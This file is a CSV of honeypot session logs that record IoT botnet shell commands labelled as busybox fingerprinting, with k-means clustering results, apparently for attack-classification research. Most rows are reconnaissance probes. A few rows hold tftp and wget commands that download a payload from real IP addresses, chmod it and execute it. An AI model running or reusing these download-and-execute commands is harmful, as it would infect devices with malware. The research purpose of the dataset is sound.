,session,command_freq,input,attack_cat,label_nr,label_desc,duration,SeededKmeans_result,Kmeans_results,PCKmeans_exp_result
5715,b13a19a2c03c,11,cat /bin/busybox,Fingerprinting,0,busybox fingerprinting,131.25538420677185,0,3,4
5716,b13a19a2c03c,11,while read i,Fingerprinting,0,busybox fingerprinting,131.25538420677185,0,3,4
5717,b13a19a2c03c,11,dd if=/bin/busybox bs=22 count=1,Fingerprinting,0,busybox fingerprinting,131.25538420677185,0,3,4
5718,6d62c5c9114d,11,enable,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5719,6d62c5c9114d,11,system,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5720,6d62c5c9114d,11,system,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5721,6d62c5c9114d,11,shell,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5722,6d62c5c9114d,11,shell,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5723,6d62c5c9114d,11,sh,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5724,6d62c5c9114d,11,/bin/busybox VENUSZUELA,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5725,6d62c5c9114d,11,/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5726,6d62c5c9114d,11,cat /bin/busybox,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5727,6d62c5c9114d,11,while read i,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5728,6d62c5c9114d,11,dd if=/bin/busybox bs=22 count=1,Fingerprinting,0,busybox fingerprinting,131.49928855895996,0,3,4
5729,996236e523f5,11,enable,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5730,996236e523f5,11,system,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5731,996236e523f5,11,system,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5732,996236e523f5,11,shell,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5733,996236e523f5,11,shell,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5734,996236e523f5,11,sh,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5735,996236e523f5,11,/bin/busybox VENUSZUELA,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5736,996236e523f5,11,/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5737,996236e523f5,11,cat /bin/busybox,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5738,996236e523f5,11,while read i,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5739,996236e523f5,11,dd if=/bin/busybox bs=22 count=1,Fingerprinting,0,busybox fingerprinting,131.68212962150574,0,3,4
5740,fa4732b8bc80,11,enable,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5741,fa4732b8bc80,11,system,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5742,fa4732b8bc80,11,system,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5743,fa4732b8bc80,11,shell,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5744,fa4732b8bc80,11,shell,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5745,fa4732b8bc80,11,sh,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5746,fa4732b8bc80,11,/bin/busybox VENUSZUELA,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5747,fa4732b8bc80,11,/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5748,fa4732b8bc80,11,cat /bin/busybox,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5749,fa4732b8bc80,11,while read i,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5750,fa4732b8bc80,11,dd if=/bin/busybox bs=22 count=1,Fingerprinting,0,busybox fingerprinting,131.74230432510376,0,3,4
5751,a8e98a605368,13,enable,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5752,a8e98a605368,13,system,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5753,a8e98a605368,13,system,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5754,a8e98a605368,13,shell,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5755,a8e98a605368,13,shell,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5756,a8e98a605368,13,sh,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5757,a8e98a605368,13,cat /proc/mounts; /bin/busybox YGIZW,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5758,a8e98a605368,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YGIZW,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5759,a8e98a605368,13,tftp; wget; /bin/busybox YGIZW,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5760,a8e98a605368,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5761,a8e98a605368,13,while read i,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5762,a8e98a605368,13,/bin/busybox YGIZW,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5763,a8e98a605368,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.4300479888916011,0,3,2
5764,2bac30288b22,13,enable,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5765,2bac30288b22,13,system,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5766,2bac30288b22,13,system,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5767,2bac30288b22,13,shell,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5768,2bac30288b22,13,shell,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5769,2bac30288b22,13,sh,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5770,2bac30288b22,13,cat /proc/mounts; /bin/busybox MWIFM,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5771,2bac30288b22,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MWIFM,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5772,2bac30288b22,13,tftp; wget; /bin/busybox MWIFM,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5773,2bac30288b22,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5774,2bac30288b22,13,while read i,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5775,2bac30288b22,13,/bin/busybox MWIFM,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5776,2bac30288b22,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,14.378341913223268,0,3,2
5777,4277900fc1b6,14,enable,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5778,4277900fc1b6,14,system,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5779,4277900fc1b6,14,system,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5780,4277900fc1b6,14,shell,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5781,4277900fc1b6,14,shell,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5782,4277900fc1b6,14,sh,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5783,4277900fc1b6,14,cat /proc/mounts; /bin/busybox WLZDM,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5784,4277900fc1b6,14,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WLZDM,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5785,4277900fc1b6,14,tftp; wget; /bin/busybox WLZDM,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5786,4277900fc1b6,14,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5787,4277900fc1b6,14,while read i,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5788,4277900fc1b6,14,/bin/busybox WLZDM,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5789,4277900fc1b6,14,rm .s; tftp -l.i -r.i -g 37.113.52.123:38959; chmod 777 .i; ./.i; exit,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5790,4277900fc1b6,14,./.i,Fingerprinting,0,busybox fingerprinting,14.450870037078856,0,3,2
5791,eaf6d0812143,12,enable,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5792,eaf6d0812143,12,system,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5793,eaf6d0812143,12,system,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5794,eaf6d0812143,12,shell,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5795,eaf6d0812143,12,shell,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5796,eaf6d0812143,12,sh,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5797,eaf6d0812143,12,cat /proc/mounts; /bin/busybox FSDLN,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5798,eaf6d0812143,12,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FSDLN,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5799,eaf6d0812143,12,tftp; wget; /bin/busybox FSDLN,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5800,eaf6d0812143,12,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5801,eaf6d0812143,12,while read i,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5802,eaf6d0812143,12,/bin/busybox FSDLN,Fingerprinting,0,busybox fingerprinting,14.615695714950562,0,3,4
5803,0ba9a5c194b2,13,enable,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5804,0ba9a5c194b2,13,system,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5805,0ba9a5c194b2,13,system,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5806,0ba9a5c194b2,13,shell,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5807,0ba9a5c194b2,13,shell,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5808,0ba9a5c194b2,13,sh,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5809,0ba9a5c194b2,13,cat /proc/mounts; /bin/busybox LYKJM,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5810,0ba9a5c194b2,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LYKJM,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5811,0ba9a5c194b2,13,tftp; wget; /bin/busybox LYKJM,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5812,0ba9a5c194b2,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5813,0ba9a5c194b2,13,while read i,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5814,0ba9a5c194b2,13,/bin/busybox LYKJM,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5815,0ba9a5c194b2,13,rm .s; wget http://158.140.65.153:37871/.i; chmod 777 .i; ./.i; exit,Fingerprinting,0,busybox fingerprinting,15.915402173995972,0,3,2
5816,7b4c41825474,13,enable,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5817,7b4c41825474,13,system,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5818,7b4c41825474,13,system,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5819,7b4c41825474,13,shell,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5820,7b4c41825474,13,shell,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5821,7b4c41825474,13,sh,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5822,7b4c41825474,13,cat /proc/mounts; /bin/busybox TLDTB,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5823,7b4c41825474,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TLDTB,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5824,7b4c41825474,13,tftp; wget; /bin/busybox TLDTB,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5825,7b4c41825474,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5826,7b4c41825474,13,while read i,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5827,7b4c41825474,13,/bin/busybox TLDTB,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5828,7b4c41825474,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,16.156800746917725,0,3,2
5829,154b208b0b09,13,enable,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5830,154b208b0b09,13,system,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5831,154b208b0b09,13,system,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5832,154b208b0b09,13,shell,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5833,154b208b0b09,13,shell,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5834,154b208b0b09,13,sh,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5835,154b208b0b09,13,cat /proc/mounts; /bin/busybox GRCMR,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5836,154b208b0b09,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GRCMR,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5837,154b208b0b09,13,tftp; wget; /bin/busybox GRCMR,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5838,154b208b0b09,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5839,154b208b0b09,13,while read i,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5840,154b208b0b09,13,/bin/busybox GRCMR,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5841,154b208b0b09,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.6683411598205562,0,3,2
5842,90e7c8122803,13,enable,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5843,90e7c8122803,13,system,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5844,90e7c8122803,13,system,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5845,90e7c8122803,13,shell,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5846,90e7c8122803,13,shell,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5847,90e7c8122803,13,sh,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5848,90e7c8122803,13,cat /proc/mounts; /bin/busybox QIBDO,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5849,90e7c8122803,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QIBDO,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5850,90e7c8122803,13,tftp; wget; /bin/busybox QIBDO,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5851,90e7c8122803,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5852,90e7c8122803,13,while read i,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5853,90e7c8122803,13,/bin/busybox QIBDO,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5854,90e7c8122803,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,16.856661081314087,0,3,2
5855,5b74c45348fc,14,enable,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5856,5b74c45348fc,14,system,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5857,5b74c45348fc,14,system,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5858,5b74c45348fc,14,shell,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5859,5b74c45348fc,14,shell,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5860,5b74c45348fc,14,sh,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5861,5b74c45348fc,14,cat /proc/mounts; /bin/busybox DXVAP,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5862,5b74c45348fc,14,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DXVAP,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5863,5b74c45348fc,14,tftp; wget; /bin/busybox DXVAP,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5864,5b74c45348fc,14,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5865,5b74c45348fc,14,while read i,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5866,5b74c45348fc,14,/bin/busybox DXVAP,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5867,5b74c45348fc,14,rm .s; tftp -l.i -r.i -g 31.28.249.247:5692; chmod 777 .i; ./.i; exit,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5868,5b74c45348fc,14,./.i,Fingerprinting,0,busybox fingerprinting,17.279196977615356,0,3,2
5869,403394560421,12,enable,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5870,403394560421,12,system,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5871,403394560421,12,system,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5872,403394560421,12,shell,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5873,403394560421,12,shell,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5874,403394560421,12,sh,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5875,403394560421,12,cat /proc/mounts; /bin/busybox QGXPK,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5876,403394560421,12,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QGXPK,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5877,403394560421,12,tftp; wget; /bin/busybox QGXPK,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5878,403394560421,12,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5879,403394560421,12,while read i,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5880,403394560421,12,/bin/busybox QGXPK,Fingerprinting,0,busybox fingerprinting,181.22832131385803,0,3,4
5881,8f4835fffd4b,12,enable,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5882,8f4835fffd4b,12,system,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5883,8f4835fffd4b,12,system,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5884,8f4835fffd4b,12,shell,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5885,8f4835fffd4b,12,shell,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5886,8f4835fffd4b,12,sh,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5887,8f4835fffd4b,12,cat /proc/mounts; /bin/busybox BTUAA,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5888,8f4835fffd4b,12,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BTUAA,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5889,8f4835fffd4b,12,tftp; wget; /bin/busybox BTUAA,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5890,8f4835fffd4b,12,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5891,8f4835fffd4b,12,while read i,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5892,8f4835fffd4b,12,/bin/busybox BTUAA,Fingerprinting,0,busybox fingerprinting,182.45109224319447,0,3,4
5893,6adab8198bb9,13,enable,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5894,6adab8198bb9,13,system,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5895,6adab8198bb9,13,system,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5896,6adab8198bb9,13,shell,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5897,6adab8198bb9,13,shell,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5898,6adab8198bb9,13,sh,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5899,6adab8198bb9,13,cat /proc/mounts; /bin/busybox PYEHF,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5900,6adab8198bb9,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PYEHF,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5901,6adab8198bb9,13,tftp; wget; /bin/busybox PYEHF,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5902,6adab8198bb9,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5903,6adab8198bb9,13,while read i,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5904,6adab8198bb9,13,/bin/busybox PYEHF,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5905,6adab8198bb9,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.8590679168701167,0,3,2
5906,1ce093dd0cc2,13,enable,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5907,1ce093dd0cc2,13,system,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5908,1ce093dd0cc2,13,system,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5909,1ce093dd0cc2,13,shell,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5910,1ce093dd0cc2,13,shell,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5911,1ce093dd0cc2,13,sh,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5912,1ce093dd0cc2,13,cat /proc/mounts; /bin/busybox XUDMD,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5913,1ce093dd0cc2,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XUDMD,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5914,1ce093dd0cc2,13,tftp; wget; /bin/busybox XUDMD,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5915,1ce093dd0cc2,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5916,1ce093dd0cc2,13,while read i,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5917,1ce093dd0cc2,13,/bin/busybox XUDMD,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5918,1ce093dd0cc2,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.9447729587554927,0,3,2
5919,c66cc7211936,13,enable,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5920,c66cc7211936,13,system,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5921,c66cc7211936,13,system,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5922,c66cc7211936,13,shell,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5923,c66cc7211936,13,shell,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5924,c66cc7211936,13,sh,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5925,c66cc7211936,13,cat /proc/mounts; /bin/busybox WVIDL,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5926,c66cc7211936,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WVIDL,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5927,c66cc7211936,13,tftp; wget; /bin/busybox WVIDL,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5928,c66cc7211936,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5929,c66cc7211936,13,while read i,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5930,c66cc7211936,13,/bin/busybox WVIDL,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5931,c66cc7211936,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,26.586844444274902,0,3,2
5932,23dfbb76838e,13,enable,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5933,23dfbb76838e,13,system,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5934,23dfbb76838e,13,system,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5935,23dfbb76838e,13,shell,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5936,23dfbb76838e,13,shell,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5937,23dfbb76838e,13,sh,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5938,23dfbb76838e,13,cat /proc/mounts; /bin/busybox HBGMS,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5939,23dfbb76838e,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HBGMS,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5940,23dfbb76838e,13,tftp; wget; /bin/busybox HBGMS,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5941,23dfbb76838e,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5942,23dfbb76838e,13,while read i,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5943,23dfbb76838e,13,/bin/busybox HBGMS,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
